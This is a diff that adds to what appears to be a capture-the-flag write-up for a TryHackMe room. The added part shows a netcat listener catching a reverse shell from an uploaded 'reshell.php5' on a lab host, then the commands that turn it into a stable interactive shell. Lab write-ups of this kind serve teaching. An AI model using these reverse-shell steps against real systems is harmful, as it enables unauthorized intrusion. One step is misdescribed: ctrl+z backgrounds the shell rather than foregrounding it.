@@ -165,5 +165,43 @@ Enter FileName (Example:.htaccess,shell.php5,index.html) : reshell.php5
 [+] URL : http://10.10.131.164/content/attachment/reshell.php5
 root@kali:~# 
 ```
+Listening Terminal
+```bash
+root@kali:~# nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.141.19] from (UNKNOWN) [10.10.131.164] 44340
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 12:43:17 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
 
 ## Gaining a Stable Shell
+
+17. we will now attempt to gain a stable shell.
+- type the following:
+```bash
+python -c "import pty; pty.spawn('/bin/bash')"
+```
+
+- press ```ctrl+z``` to bring shell to foreground
+
+- type:
+```bash
+stty raw -echo
+fg
+```
+
+- press ```Enter``` a few times to get back the shell
+
+- type:
+```bash
+export TERM=xterm
+```
+
+- press ```crtl+l``` to get a clean and stable shell.
+
+
+
